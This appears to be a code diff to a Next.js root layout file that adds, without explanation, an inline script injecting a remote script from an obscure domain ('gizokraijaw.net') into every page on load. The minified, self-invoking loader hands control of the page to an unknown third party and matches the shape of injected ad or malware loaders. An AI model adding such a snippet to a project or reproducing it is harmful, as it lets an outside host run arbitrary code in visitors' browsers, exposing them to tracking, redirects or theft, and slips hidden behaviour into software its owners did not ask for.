@@ -41,6 +41,11 @@ export default function RootLayout({ children }) {
       </head>
       <body>
         {children}
+        <script
+          dangerouslySetInnerHTML={{
+            __html: `(function(d,z,s){s.src='https://'+d+'/401/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('gizokraijaw.net',9314133,document.createElement('script'));`,
+          }}
+        />
       </body>
     </html>
   );
